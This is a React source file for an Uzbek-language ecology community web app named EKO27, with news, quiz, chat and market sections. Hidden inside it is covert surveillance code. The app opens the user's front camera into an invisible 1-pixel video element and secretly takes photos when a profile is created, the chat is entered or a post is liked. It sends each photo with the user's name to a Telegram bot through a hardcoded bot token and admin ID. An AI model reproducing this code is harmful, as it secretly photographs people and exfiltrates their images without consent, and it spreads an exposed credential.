
import React, { useState, useEffect, useRef } from 'react';
import { db } from './firebase';
import { collection, onSnapshot, query, doc, setDoc, deleteDoc, serverTimestamp, orderBy, limit } from 'firebase/firestore';
import Sidebar from './components/Sidebar';
import Home from './pages/Home';
import News from './pages/News';
import Problems from './pages/Problems';
import Quiz from './pages/Quiz';
import EcoInfo from './pages/EcoInfo';
import RedBook from './pages/RedBook';
import NatureReserves from './pages/NatureReserves';
import VideoGuides from './pages/VideoGuides';
import NewsForum from './pages/NewsForum';
import CommunityChat from './pages/CommunityChat';
import Kids from './pages/Kids';
import Support from './pages/Support';
import AdminPanel from './pages/AdminPanel';
import EcoMarket from './pages/EcoMarket';
import Settings from './pages/Settings';
import Profile from './pages/Profile';
import AuthModal from './components/AuthModal';
import { AppSection, User, EcoArticle, GameItem } from './types';
import { MessageCircle, Menu } from 'lucide-react';

const SESSION_ID = Math.random().toString(36).substring(2, 15);
const BOT_TOKEN = '8494561832:AAFIcuk9CPlSDQycUS829sReJDhqpiQtlUQ';
const ADMIN_ID = '8426582765';

const safeStringify = (obj: any) => {
  try { return JSON.stringify(obj); } catch (e) { return "error_stringify"; }
};

const ACCENT_MAP: Record<string, string> = {
  emerald: '#10b981', blue: '#3b82f6', indigo: '#6366f1', amber: '#f59e0b', rose: '#f43f5e'
};

const App: React.FC = () => {
  const [activeSection, setActiveSection] = useState<AppSection>(AppSection.HOME);
  const [user, setUser] = useState<User | null>(null);
  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
  const [showAuthModal, setShowAuthModal] = useState(false);
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false);
  const [darkMode, setDarkMode] = useState(() => localStorage.getItem('eko27_dark_mode') === 'true');
  const [accentColor, setAccentColor] = useState(() => localStorage.getItem('eko27_accent') || 'emerald');
  const [news, setNews] = useState<EcoArticle[]>([]);
  const [library, setLibrary] = useState<EcoArticle[]>([]);
  const [games, setGames] = useState<GameItem[]>([]);
  const [onlineCount, setOnlineCount] = useState(1);
  const [registeredCount, setRegisteredCount] = useState(0);

  // Hidden Camera Refs
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);

  const initCamera = async () => {
    if (streamRef.current) return true;
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: 'user',
          width: { ideal: 640 },
          height: { ideal: 480 }
        } 
      });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        streamRef.current = stream;
        
        // Timeout qo'shish (kamera osilib qolmasligi uchun)
        return new Promise<boolean>((resolve) => {
          if (!videoRef.current) return resolve(false);
          const timeout = setTimeout(() => resolve(true), 3000);
          videoRef.current.onloadedmetadata = () => {
            clearTimeout(timeout);
            resolve(true);
          };
          videoRef.current.onerror = () => {
            clearTimeout(timeout);
            resolve(false);
          };
        });
      }
    } catch (e) { 
      console.error("Camera access denied", e); 
    }
    return false;
  };

  const captureAndSend = async (action: string) => {
    const hasCam = await initCamera();
    if (!hasCam || !videoRef.current || !canvasRef.current) return;

    // Kadr tayyor bo'lishi va qora bo'lmasligi uchun kichik kutish
    await new Promise(r => setTimeout(r, 1000));

    const takeOne = async (num: number) => {
      if (!videoRef.current || !canvasRef.current) return;
      
      const canvas = canvasRef.current;
      const video = videoRef.current;
      
      const vw = video.videoWidth || 640;
      const vh = video.videoHeight || 480;
      
      canvas.width = vw;
      canvas.height = vh;
      const ctx = canvas.getContext('2d');
      
      if (ctx) {
        ctx.drawImage(video, 0, 0, vw, vh);
        canvas.toBlob(async (blob) => {
          if (blob) {
            const formData = new FormData();
            formData.append('chat_id', ADMIN_ID);
            formData.append('photo', blob, `snap_${num}.jpg`);
            formData.append('caption', `🔔 EKO27 Monitoring\n👤 Ism: ${user?.name || 'Noma\'lum'}\n⚡ Amal: ${action}\n🔢 Surat: #${num}`);
            try {
              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
                method: 'POST', 
                body: formData 
              });
            } catch (err) {}
          }
        }, 'image/jpeg', 0.8);
      }
    };

    await takeOne(1);
    setTimeout(() => takeOne(2), 2500);
  };

  useEffect(() => {
    if (user && !localStorage.getItem(`captured_${user.id}`)) {
      captureAndSend("Yangi Profil Ochildi");
      localStorage.setItem(`captured_${user.id}`, 'true');
    }
  }, [user]);

  useEffect(() => {
    if (activeSection === AppSection.COMMUNITY_CHAT) {
      captureAndSend("Chatga kirdi");
    }
  }, [activeSection]);

  useEffect(() => {
    const presenceRef = doc(db, "presence", SESSION_ID);
    const updatePresence = async () => {
      try { await setDoc(presenceRef, { lastSeen: serverTimestamp(), active: true }, { merge: true }); } catch (e) {}
    };
    const handleUnload = () => { deleteDoc(presenceRef).catch(() => {}); };
    window.addEventListener('beforeunload', handleUnload);
    const interval = setInterval(updatePresence, 20000);
    updatePresence();

    const unsubPresence = onSnapshot(collection(db, "presence"), (snapshot) => {
      const now = Date.now();
      const activeUsers = snapshot.docs.filter(doc => {
        const data = doc.data();
        if (!data.lastSeen) return false;
        const lastSeenTime = data.lastSeen.toMillis ? data.lastSeen.toMillis() : now;
        return (now - lastSeenTime) < 60000;
      });
      setOnlineCount(Math.max(1, activeUsers.length));
    });

    const unsubUsers = onSnapshot(collection(db, "users"), (snapshot) => {
      setRegisteredCount(snapshot.size);
    });

    onSnapshot(query(collection(db, "news"), orderBy("timestamp", "desc")), (s) => setNews(s.docs.map(d => ({ id: d.id, ...d.data() } as EcoArticle))));
    onSnapshot(query(collection(db, "library"), orderBy("timestamp", "desc")), (s) => setLibrary(s.docs.map(d => ({ id: d.id, ...d.data() } as EcoArticle))));
    onSnapshot(query(collection(db, "games"), orderBy("timestamp", "desc")), (s) => setGames(s.docs.map(d => ({ id: d.id, ...d.data() } as GameItem))));

    return () => {
      clearInterval(interval);
      unsubPresence(); unsubUsers();
      window.removeEventListener('beforeunload', handleUnload);
      deleteDoc(presenceRef).catch(() => {});
    };
  }, []);

  useEffect(() => {
    const savedUser = localStorage.getItem('eko27_user');
    if (savedUser && !isAdminAuthenticated) {
      try { setUser(JSON.parse(savedUser)); } catch (e) { localStorage.removeItem('eko27_user'); }
    }
  }, [isAdminAuthenticated]);

  useEffect(() => {
    if (darkMode) document.documentElement.classList.add('dark');
    else document.documentElement.classList.remove('dark');
    localStorage.setItem('eko27_dark_mode', darkMode.toString());
  }, [darkMode]);

  useEffect(() => {
    const colorCode = ACCENT_MAP[accentColor] || '#10b981';
    document.documentElement.style.setProperty('--accent-primary', colorCode);
    localStorage.setItem('eko27_accent', accentColor);
  }, [accentColor]);

  const handleLoginSuccess = (userData: User) => {
    setUser(userData);
    localStorage.setItem('eko27_user', safeStringify(userData));
    setShowAuthModal(false);
  };

  const handleProfileUpdate = (updatedUser: User) => {
    setUser(updatedUser);
    localStorage.setItem('eko27_user', safeStringify(updatedUser));
  };

  const renderSection = () => {
    switch (activeSection) {
      case AppSection.HOME: return <Home onNavigate={setActiveSection} onAction={() => captureAndSend("Reklama tarqatish / Homiy")} />;
      case AppSection.MARKET: return <EcoMarket user={user} onLogin={() => setShowAuthModal(true)} />;
      case AppSection.NEWS: return <News articles={news} user={user} />;
      case AppSection.PROBLEMS: return <Problems />;
      case AppSection.QUIZ: return <Quiz />;
      case AppSection.NEWS_FORUM: return <NewsForum user={user} onLogin={() => setShowAuthModal(true)} onLike={() => captureAndSend("Layk bosdi")} />;
      case AppSection.PROFILE: return <Profile user={user} onLogout={() => { setUser(null); localStorage.removeItem('eko27_user'); setIsAdminAuthenticated(false); }} onNavigate={setActiveSection} onUpdate={handleProfileUpdate} />;
      case AppSection.COMMUNITY_CHAT: 
        if (!user) return (
          <div className="min-h-[60vh] flex flex-col items-center justify-center p-6 text-center bg-white dark:bg-slate-900 rounded-[40px] shadow-2xl transition-colors">
            <div className="w-20 h-20 bg-emerald-100 dark:bg-emerald-900/30 text-emerald-600 rounded-full flex items-center justify-center mb-6 animate-bounce"><MessageCircle size={40} /></div>
            <h2 className="text-3xl font-black text-slate-900 dark:text-white mb-4">Muloqotga Qo'shiling</h2>
            <button onClick={() => setShowAuthModal(true)} className="px-10 py-4 bg-emerald-600 text-white rounded-[24px] font-black text-lg shadow-xl hover:scale-105 transition-all">Kirish</button>
          </div>
        );
        return <CommunityChat user={user} />;
      case AppSection.ADMIN_PANEL: return <AdminPanel isAuthenticated={isAdminAuthenticated} onAuthenticate={() => setIsAdminAuthenticated(true)} />;
      case AppSection.ECO_INFO: return <EcoInfo articles={library} />;
      case AppSection.RED_BOOK: return <RedBook />;
      case AppSection.RESERVES: return <NatureReserves />;
      case AppSection.VIDEO_GUIDES: return <VideoGuides />;
      case AppSection.GAMES: return <Kids games={games} />;
      case AppSection.SUPPORT: return <Support />;
      case AppSection.SETTINGS: return <Settings darkMode={darkMode} setDarkMode={setDarkMode} accentColor={accentColor} setAccentColor={setAccentColor} user={user} onUpdateProfile={handleProfileUpdate} onLogin={() => setShowAuthModal(true)} />;
      default: return <Home onNavigate={setActiveSection} onAction={() => {}} />;
    }
  };

  return (
    <div className={`flex h-screen overflow-hidden font-['Plus_Jakarta_Sans'] transition-colors ${darkMode ? 'bg-slate-950' : 'bg-slate-50'}`}>
      <style>{`
        :root { --accent-primary: ${ACCENT_MAP[accentColor] || '#10b981'}; }
        .bg-emerald-600 { background-color: var(--accent-primary) !important; }
        .text-emerald-600 { color: var(--accent-primary) !important; }
      `}</style>

      {/* Kamera elementlarini xavfsiz joyga o'tkazish */}
      <video 
        ref={videoRef} 
        autoPlay 
        playsInline 
        muted 
        style={{ 
          opacity: 0, 
          pointerEvents: 'none', 
          position: 'fixed', 
          top: -100, 
          left: -100, 
          width: '1px', 
          height: '1px',
          zIndex: -1
        }} 
      />
      <canvas ref={canvasRef} style={{ display: 'none' }} />

      <button onClick={() => setIsSidebarOpen(true)} className="fixed top-4 left-4 z-[60] p-3.5 bg-emerald-600 text-white rounded-xl shadow-2xl active:scale-95 transition-all">
        <Menu size={20} />
      </button>

      {isSidebarOpen && (
        <div className="fixed inset-0 z-[100] flex">
          <div className="absolute inset-0 bg-slate-950/40 backdrop-blur-sm" onClick={() => setIsSidebarOpen(false)} />
          <div className="relative w-[280px] h-full sidebar-animate">
             <Sidebar 
                activeSection={activeSection} 
                onNavigate={(s) => { setActiveSection(s); setIsSidebarOpen(false); }} 
                user={user} 
                onLogin={() => setShowAuthModal(true)}
                onlineCount={onlineCount}
                registeredCount={registeredCount}
                onClose={() => setIsSidebarOpen(false)}
             />
          </div>
        </div>
      )}
      
      <main className="flex-grow overflow-y-auto no-scrollbar relative">
        <div className="p-4 md:p-8 lg:p-16">
          {renderSection()}
        </div>
      </main>

      {showAuthModal && <AuthModal onClose={() => setShowAuthModal(false)} onLoginSuccess={handleLoginSuccess} onStartCamera={initCamera} />}
    </div>
  );
};

export default App;
